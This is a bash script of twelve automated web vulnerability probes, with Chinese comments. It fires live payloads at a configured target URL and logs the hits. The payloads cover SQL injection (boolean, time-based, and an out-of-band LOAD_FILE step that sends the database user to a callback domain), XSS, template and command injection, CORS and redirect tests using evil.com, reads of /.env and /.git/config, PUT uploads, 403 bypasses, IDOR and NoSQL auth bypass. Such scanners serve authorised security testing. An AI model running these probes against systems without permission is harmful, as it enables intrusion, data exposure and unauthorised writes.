#!/usr/bin/env bash
# tier1_universal.sh — Tier 1 通用探针（12 个，永远跑）
#
# 用法：
#   source probes/tier1_universal.sh   # 注册函数（零副作用）
#   run_probes_tier1                    # 执行
#
# 依赖：$TMP / $SHARED（由 infra/directory_setup.md 的 init_hackprobe_dir 导出）

# ====== 路径 fallback（正常流程由 init_hackprobe_dir 导出）======
if [ -z "${SHARED:-}" ] || [ -z "${TMP:-}" ]; then
  echo "[probes] WARN: \$SHARED/\$TMP 未定义 —— 请先 source infra/directory_setup.md 并调 init_hackprobe_dir" >&2
  WORK_DIR="${WORK_ROOT:-$(pwd)}"
  TMP="${TMP:-${WORK_DIR}/_work/tmp}"
  SHARED="${SHARED:-${WORK_DIR}/_work/shared}"
fi
mkdir -p "$TMP" "$SHARED"

# ====== OAST 加载（只读，**不在 source 时启动服务**）======
# source 阶段必须零副作用：启动 interactsh 是网络操作，会阻塞整个 source。
# 真正的启动放在 oast_init()，由 run_probes_tier1 在开跑前调用。
OAST_DOMAIN="${OAST_DOMAIN:-}"
if [ -z "$OAST_DOMAIN" ] && [ -f "$SHARED/oast.json" ]; then
  # 路径经 argv 传入（含中文的绝对路径展开进 Python 源码会被 git-bash 的 GBK 写坏）
  OAST_DOMAIN=$(python3 -c '
import json, sys
try:
    print(json.load(open(sys.argv[1], encoding="utf-8")).get("domain", ""))
except Exception:
    print("")' "$SHARED/oast.json" 2>/dev/null)
fi

oast_init() {
  if [ -n "${OAST_DOMAIN:-}" ]; then
    echo "[probes] OAST domain: $OAST_DOMAIN"
    return 0
  fi
  if [ -f "infra/oast_setup.md" ]; then
    source infra/oast_setup.md 2>/dev/null
    if declare -f oast_lifecycle >/dev/null 2>&1; then
      oast_lifecycle start 2>/dev/null || true
      OAST_DOMAIN="${OAST_DOMAIN:-}"
    fi
  fi
  echo "[probes] OAST domain: ${OAST_DOMAIN:-NOT AVAILABLE (OOB probes will skip)}"
}

HITS_FILE="$TMP/3_probe_hits.json"
[ -s "$HITS_FILE" ] || echo '{"hits":[]}' > "$HITS_FILE"

# ====== 辅助: 记录命中 ======
# 全部字段经 argv 传参 —— 避免 evidence 里的引号/中文破坏 Python 源码
record_hit() {
  local probe="$1" category="$2" evidence="$3"
  python3 -c '
import json, sys
hf, probe, category, evidence = sys.argv[1:5]
try:
    with open(hf, encoding="utf-8") as f:
        d = json.load(f)
except Exception:
    d = {"hits": []}
d.setdefault("hits", []).append(
    {"probe": probe, "category": category, "evidence": evidence[:200]})
with open(hf, "w", encoding="utf-8") as f:
    json.dump(d, f, indent=2, ensure_ascii=False)
' "$HITS_FILE" "$probe" "$category" "$evidence"
  echo "[hit] $probe → $category | ${evidence:0:100}"
}

# ====== 辅助: 取当前 host 的带参 URL ======
# 多子域场景下 params_all.txt 是所有子域合并的，直接 head -N 会被单个大站吃光配额。
# 优先取 $HOST 自己的 URL，取不到才回退全局。
params_for_host() {
  local n="${1:-10}"
  if [ -n "${HOST:-}" ] && [ -s "$SHARED/params_all.txt" ]; then
    local mine
    mine=$(grep -F "$HOST" "$SHARED/params_all.txt" 2>/dev/null | head -n "$n")
    if [ -n "$mine" ]; then printf '%s\n' "$mine"; return; fi
  fi
  head -n "$n" "$SHARED/params_all.txt" 2>/dev/null
}

# ====== 辅助: POST body 探测 ======
test_post_body() {
  local url="$1" payload="$2" content_type="${3:-application/json}"
  curl -sk -o /dev/null -w "%{http_code}" -X POST "$url" \
    -H "Content-Type: $content_type" -d "$payload" --max-time 5 2>/dev/null
}

# ====== 收集 POST 端点（Tier 1 body 测试用，最多 5 个）======
POST_ENDPOINTS=""
for post_url in $(grep -iE '/api/|/graphql|/login|/register|/upload|/submit|/search' \
                    "$SHARED/urls_all.txt" 2>/dev/null | head -5); do
  POST_ENDPOINTS="$POST_ENDPOINTS $post_url"
done
P1_SQLi() {
  local url true_sz false_sz diff pct start_ms elapsed

  # Phase 1: Boolean blind —— 比 1=1 与 1=2 的响应体大小，差 >10% 才算
  while IFS= read -r url; do
    [ -z "$url" ] && continue
    true_sz=$(curl -sk "$url AND 1=1--" -w "%{size_download}" -o /dev/null --max-time 5)
    false_sz=$(curl -sk "$url AND 1=2--" -w "%{size_download}" -o /dev/null --max-time 5)
    if [ "$true_sz" != "$false_sz" ] && (( ${true_sz:-0} > 0 )); then
      diff=$(( true_sz > false_sz ? true_sz - false_sz : false_sz - true_sz ))
      pct=$(( diff * 100 / (true_sz > false_sz ? true_sz : false_sz) ))
      if [ "$pct" -gt 10 ]; then
        record_hit "P1" "sqli-sql-injection" \
          "Boolean blind: true=$true_sz vs false=$false_sz (${pct}% diff) at $url"
      fi
    fi
  done < <(params_for_host 10)

  # Phase 2: Error-based —— 主 URL 上的报错特征
  curl -sk "${URL}?id=1' OR '1'='1" --max-time 5 2>/dev/null \
    | grep -qiE "error|syntax|mysql|ORA-|SQLSTATE|pg_query|unterminated|SQLite" && \
    record_hit "P1" "sqli-sql-injection" "Error-based SQLi on main URL"

  # Phase 3: Time-based blind —— 耗时必须落在 2500-5500ms 窗口
  # （上限 5500 用于排除"目标本身慢"，这是原始设计里想清楚的）
  while IFS= read -r url; do
    [ -z "$url" ] && continue

    start_ms=$(date +%s%3N 2>/dev/null || echo 0)
    curl -sk "$url' AND SLEEP(3)--" -o /dev/null --max-time 6 2>/dev/null
    elapsed=$(( $(date +%s%3N 2>/dev/null || echo 0) - start_ms ))
    if [ "$elapsed" -gt 2500 ] && [ "$elapsed" -lt 5500 ]; then
      record_hit "P1" "sqli-sql-injection" "Time-based blind: SLEEP(3) → ${elapsed}ms at $url"
      break
    fi

    start_ms=$(date +%s%3N 2>/dev/null || echo 0)
    curl -sk "$url'; SELECT pg_sleep(3)--" -o /dev/null --max-time 6 2>/dev/null
    elapsed=$(( $(date +%s%3N 2>/dev/null || echo 0) - start_ms ))
    if [ "$elapsed" -gt 2500 ] && [ "$elapsed" -lt 5500 ]; then
      record_hit "P1" "sqli-sql-injection" "Time-based blind: pg_sleep(3) → ${elapsed}ms at $url"
      break
    fi
  done < <(params_for_host 3)

  # Phase 4: OOB —— 仅在 OAST 可用时发（未配置则零开销跳过）
  if [ -n "$OAST_DOMAIN" ]; then
    while IFS= read -r url; do
      [ -z "$url" ] && continue
      curl -sk "$url' AND LOAD_FILE(CONCAT('\\\\\\\\',(SELECT user()),'.${OAST_DOMAIN}\\\\a'))--" \
        -o /dev/null --max-time 5 2>/dev/null &
    done < <(params_for_host 3)
    echo "[P1] OOB probes sent to ${OAST_DOMAIN} — check interactsh for callbacks"
  fi
}
P2_XSS() {
  local param resp
  local payload_enc="%3Cscript%3Ealert(1)%3C%2Fscript%3E"
  for param in q search s query id name value input text keyword filter tag; do
    resp=$(curl -sk "${URL}?${param}=${payload_enc}" --max-time 5 2>/dev/null)
    if echo "$resp" | grep -q "<script>alert(1)</script>"; then
      record_hit "P2" "xss-cross-site-scripting" "Unencoded reflection: param=$param"
      break
    fi
    echo "$resp" | grep -q "alert(1)" && \
      record_hit "P2" "xss-cross-site-scripting" "Partial reflection: param=$param"
  done
}
P3_SSTI() {
  local param payload encoded encoded2 resp resp2 found=0
  # 多引擎 polyglot: Jinja2 / Twig / EJS / Pug / Smarty / Freemarker / Velocity
  local ssti_payloads=('{{7*7}}' '${7*7}' '<%=7*7%>' '#{7*7}' '${{7*7}}' '[[7*7]]')
  local ssti_confirm='{{9*9}} ${9*9} <%=9*9%>'

  for param in q search s id name value input data query filter; do
    for payload in "${ssti_payloads[@]}"; do
      encoded=$(python3 -c 'import sys,urllib.parse;print(urllib.parse.quote(sys.argv[1]))' "$payload" 2>/dev/null)
      [ -z "$encoded" ] && encoded="$payload"
      resp=$(curl -sk "${URL}?${param}=${encoded}" --max-time 5 2>/dev/null)

      # 看到 49 还不够 —— 必须用另一个运算（9*9=81）二次确认
      if echo "$resp" | grep -q "49"; then
        encoded2=$(python3 -c 'import sys,urllib.parse;print(urllib.parse.quote(sys.argv[1]))' "$ssti_confirm" 2>/dev/null)
        resp2=$(curl -sk "${URL}?${param}=${encoded2}" --max-time 5 2>/dev/null)
        if echo "$resp2" | grep -q "81"; then
          record_hit "P3" "ssti-server-side-template-injection" \
            "SSTI confirmed: 7*7=49 AND 9*9=81 via param=$param payload=$payload"
          found=1
          break 2
        fi
      fi
    done
  done

  # Fallback: polyglot 未命中时试框架特定 payload
  if [ "$found" = "0" ]; then
    resp=$(curl -sk "${URL}?q=$(python3 -c 'import urllib.parse;print(urllib.parse.quote("{{config}}"))' 2>/dev/null)" --max-time 5 2>/dev/null)
    echo "$resp" | grep -qiE '"DEBUG"|SECRET_KEY|SQLALCHEMY' && \
      record_hit "P3" "ssti-server-side-template-injection" "Jinja2 config object exposed"

    resp=$(curl -sk "${URL}?q=$(python3 -c 'import urllib.parse;print(urllib.parse.quote("{{_self}}"))' 2>/dev/null)" --max-time 5 2>/dev/null)
    echo "$resp" | grep -qiE "Twig_Template|__TwigTemplate" && \
      record_hit "P3" "ssti-server-side-template-injection" "Twig _self object exposed"
  fi
}
P4_CMDi() {
  local param resp
  local payloads=(';id' '|id' '$(id)' '`id`' '&id')
  for param in cmd exec command run ping ip host file path dir; do
    for p in "${payloads[@]}"; do
      resp=$(curl -sk -G --data-urlencode "${param}=${p}" "${URL}" --max-time 5 2>/dev/null)
      if echo "$resp" | grep -qiE "uid=[0-9]+\([a-z]+\)"; then
        record_hit "P4" "cmdi-command-injection" "Command execution via $param (payload=$p)"
        return 0
      fi
    done
    resp=$(curl -sk "${URL}?${param}=|whoami" --max-time 5 2>/dev/null)
    echo "$resp" | grep -qiE "root|administrator|www-data|nt authority" && {
      record_hit "P4" "cmdi-command-injection" "Command output in response: $param"
      return 0
    }
  done
}
P5_CORS() {
  local resp acao acac null_acao
  # V1: 任意 Origin + credentials
  resp=$(curl -sk -I -H "Origin: https://evil.com" "$URL" --max-time 5 2>/dev/null)
  acao=$(printf '%s' "$resp" | grep -i "access-control-allow-origin" | tr -d '\r')
  acac=$(printf '%s' "$resp" | grep -i "access-control-allow-credentials" | tr -d '\r')
  [[ "$acao" == *"evil.com"* && "$acac" == *"true"* ]] && \
    record_hit "P5" "cors-cross-origin-misconfiguration" "Arbitrary origin + credentials: $acao / $acac"

  # V2: null origin
  null_acao=$(curl -sk -I -H "Origin: null" "$URL" --max-time 5 2>/dev/null \
              | grep -i "access-control-allow-origin" | tr -d '\r')
  [[ "$null_acao" == *"null"* ]] && \
    record_hit "P5" "cors-cross-origin-misconfiguration" "Null origin accepted: $null_acao"

  # V3: 通配符 + credentials（理论互斥，实现错误才会同时出现）
  [[ "$acao" == *"*"* && "$acac" == *"true"* ]] && \
    record_hit "P5" "cors-cross-origin-misconfiguration" "Wildcard + credentials — universal CORS bypass"
}
P6_OpenRedirect() {
  local param location
  for param in url next return returnUrl goto target redirect destination continue to out; do
    location=$(curl -sk -o /dev/null -w "%{redirect_url}" --max-redirs 1 --max-time 5 \
               "${URL}?${param}=https://evil.com" 2>/dev/null)
    if [[ "$location" == *"evil.com"* ]]; then
      record_hit "P6" "open-redirect" "Open redirect via $param → $location"
      return 0
    fi
  done
}
P7_SensitiveFiles() {
  local path status size
  for path in /.env /.git/config /.git/HEAD /.svn/entries /robots.txt /sitemap.xml \
              /wp-config.php /phpinfo.php /info.php /backup.sql /dump.sql \
              /package.json /composer.json /Dockerfile /docker-compose.yml \
              /swagger.json /openapi.json /api/docs /api/swagger.json \
              /server-status /server-info /actuator/health /actuator/env; do
    status=$(curl -sk -o /dev/null -w "%{http_code}" -L --max-redirs 2 "${URL}${path}" --max-time 4 2>/dev/null)
    size=$(curl -sk -w "%{size_download}" -o /dev/null "${URL}${path}" --max-time 4 2>/dev/null)
    # 两个门控都要过：200 且 >20 字节（否则空 200 页会全量误报）
    if [[ "$status" == "200" ]] && (( ${size:-0} > 20 )); then
      case "$path" in
        /.git/*|/.svn/*)
          record_hit "P7" "insecure-source-code-management" "$path accessible: $status/${size}b" ;;
        /.env|/wp-config.php|/package.json|/Dockerfile)
          record_hit "P7" "insecure-source-code-management" "$path accessible: $status/${size}b" ;;
        /phpinfo.php|/info.php)
          record_hit "P7" "cmdi-command-injection" "phpinfo exposed: $path" ;;
        /actuator/*)
          record_hit "P7" "deserialization-insecure" "Spring Boot actuator: $path → $status" ;;
        /swagger.json|/openapi.json)
          record_hit "P7" "api-recon-and-docs" "API docs exposed: $path → $status" ;;
        *)
          record_hit "P7" "insecure-source-code-management" "$path accessible: $status/${size}b" ;;
      esac
    fi
  done
}
P8_HTTPMethods() {
  local method status up_path up_status
  for method in PUT DELETE PATCH; do
    status=$(curl -sk -o /dev/null -w "%{http_code}" -X "$method" "$URL" --max-time 5 2>/dev/null)
    if [[ "$status" != "405" && "$status" != "501" && "$status" != "000" ]]; then
      # 原实现这里写的 probe id 是 "P9"（与本节 P8 不一致），已统一为 P8
      record_hit "P8" "401-403-bypass-techniques" "$method allowed on $URL → $status"
      break
    fi
  done

  for up_path in /uploads/test.txt /files/test.txt /static/test.txt /assets/test.txt /public/test.txt; do
    up_status=$(curl -sk -o /dev/null -w "%{http_code}" -X PUT "${URL}${up_path}" \
                -d "hackprobe-test" --max-time 5 2>/dev/null)
    if [[ "$up_status" == "201" || "$up_status" == "200" ]]; then
      record_hit "P8" "upload-insecure-files" "PUT write to $up_path → $up_status"
    fi
  done
}
P10_CRLF() {
  local crlf_resp
  crlf_resp=$(curl -sk -I "${URL}?q=%0d%0aX-CRLF-Test:%20injected" --max-time 5 2>/dev/null)
  # 必须检查响应头里出现了新注入的独立头（旧版搜 body 是错的 —— 头不在 body 里）
  echo "$crlf_resp" | grep -qi "X-CRLF-Test: injected" && \
    record_hit "P10" "crlf-injection" "CRLF header injection confirmed"
}
P11_403Bypass() {
  local header h_name bypass_status path base_code variant fuzz_code

  # Phase 1: Header 绕过（6 个头，快）
  for header in "X-Original-URL: /admin" "X-Rewrite-URL: /admin" "X-Forwarded-For: 127.0.0.1" \
                "X-Forwarded-Host: 127.0.0.1" "X-Client-IP: 127.0.0.1" "X-Real-IP: 127.0.0.1"; do
    h_name=$(echo "$header" | cut -d: -f1)
    bypass_status=$(curl -sk -o /dev/null -w "%{http_code}" -H "$header" "${URL}/admin" --max-time 5 2>/dev/null)
    if [ "$bypass_status" = "200" ]; then
      record_hit "P11" "401-403-bypass-techniques" "403 bypass via $h_name → 200"
      return 0
    fi
  done

  # Phase 2: 路径绕过 —— **必须先确认 base 返 403 才 fuzz**
  # 否则任何 /admin/ 跳登录页（302）的站都会被误报成"403 绕过"
  for path in "/admin" "/api" "/dashboard"; do
    base_code=$(curl -sk -o /dev/null -w "%{http_code}" "${URL}${path}" --max-time 5 2>/dev/null)
    [ "$base_code" != "403" ] && continue

    for variant in "${path}/" "${path};" "${path}%2e" "/.${path}" "${path}..;/" \
                   "${path}.json" "${path}%23/..%23/"; do
      fuzz_code=$(curl -sk -o /dev/null -w "%{http_code}" --path-as-is "${URL}${variant}" --max-time 5 2>/dev/null)
      if [ "$fuzz_code" != "403" ] && [ "$fuzz_code" != "404" ] && [ "$fuzz_code" != "000" ]; then
        record_hit "P11" "401-403-bypass-techniques" \
          "403 path bypass: ${path} → ${variant} → $fuzz_code"
        return 0
      fi
    done
  done
}
P12_IDOR() {
  local url base sz1 sz3
  while IFS= read -r url; do
    [ -z "$url" ] && continue
    # 把数字/UUID 值替换成占位符 X，再分别填 1 / 3 比对
    base=$(echo "$url" | sed 's/=\([0-9]\+\)/=X/g' | sed 's/=\([a-f0-9-]\+\)/=X/g')
    [ "$base" = "$url" ] && continue        # 没替换成功说明无 ID 参数
    sz1=$(curl -sk "${base/X/1}" -w "%{size_download}" -o /dev/null --max-time 5 2>/dev/null)
    sz3=$(curl -sk "${base/X/3}" -w "%{size_download}" -o /dev/null --max-time 5 2>/dev/null)
    # 两个响应都要 >100 字节且大小不同，才视为越权信号
    # （注意：算术比较不能给数字加引号，否则 bash 会当成命令去执行）
    if [ "$sz1" != "$sz3" ] && (( ${sz1:-0} > 100 && ${sz3:-0} > 100 )); then
      record_hit "P12" "idor-broken-object-authorization" \
        "Response differs for ID 1 vs 3 at $url: ${sz1}b vs ${sz3}b"
      return 0
    fi
  done < <(grep -iE '[?&](id|uid|user_id|uuid)=' "$SHARED/params_idor.txt" 2>/dev/null | head -5)
}
P12_5_POST_Body() {
  local post_url resp status
  for post_url in $POST_ENDPOINTS; do
    [ -z "$post_url" ] && continue

    # A. SQLi via JSON body
    status=$(test_post_body "$post_url" '{"id":"1'"'"' OR 1=1--"}' "application/json")
    if [ "$status" = "200" ]; then
      curl -sk -X POST "$post_url" -H "Content-Type: application/json" \
        -d '{"id":"1'"'"' OR 1=1--"}' --max-time 5 2>/dev/null \
        | grep -qiE "error|syntax|mysql|ORA-|unterminated" && \
        record_hit "P12.5" "sqli-sql-injection" "SQLi via JSON POST body at $post_url"
    fi

    # B. SSTI via JSON body（同样要双重确认，避免页面本就含 49）
    resp=$(curl -sk -X POST "$post_url" -H "Content-Type: application/json" \
      -d '{"q":"{{7*7}}"}' --max-time 5 2>/dev/null)
    if echo "$resp" | grep -q "49"; then
      resp=$(curl -sk -X POST "$post_url" -H "Content-Type: application/json" \
        -d '{"q":"{{9*9}}"}' --max-time 5 2>/dev/null)
      echo "$resp" | grep -q "81" && \
        record_hit "P12.5" "ssti-server-side-template-injection" "SSTI via JSON POST body at $post_url"
    fi

    # C. NoSQL 认证绕过
    resp=$(curl -sk -X POST "$post_url" -H "Content-Type: application/json" \
      -d '{"username":{"$ne":""},"password":{"$ne":""}}' --max-time 5 2>/dev/null)
    echo "$resp" | grep -qiE "success|authenticated|welcome|dashboard|token" && \
      record_hit "P12.5" "nosql-injection" "NoSQL auth bypass via JSON POST body at $post_url"

    # D. 参数污染
    resp=$(curl -sk -X POST "$post_url" -H "Content-Type: application/x-www-form-urlencoded" \
      -d "id=1&id=2&id=3" --max-time 5 2>/dev/null)
    echo "$resp" | grep -qiE "error|invalid|multiple|duplicate" && \
      record_hit "P12.5" "http-parameter-pollution" "HTTP parameter pollution via POST body at $post_url"

    break   # 只测第一个 POST 端点，省时间
  done
}
run_probes_tier1() {
  echo "[probes] ====== $(date +%H:%M:%S) Tier 1: Universal (12 probes) ======"

  oast_init   # 副作用集中在这里：真正需要 OAST 时才启动服务

  P1_SQLi
  P2_XSS
  P3_SSTI
  P4_CMDi
  P5_CORS
  P6_OpenRedirect
  P7_SensitiveFiles
  P8_HTTPMethods
  P10_CRLF
  P11_403Bypass
  P12_IDOR
  P12_5_POST_Body

  # 计数经 argv 传参（含中文的路径不能展开进 Python 源码）
  echo "[probes] Tier 1 done: $(python3 -c '
import json, sys
try:
    print(len(json.load(open(sys.argv[1], encoding="utf-8")).get("hits", [])))
except Exception:
    print(0)' "$HITS_FILE" 2>/dev/null || echo 0) hits"
}
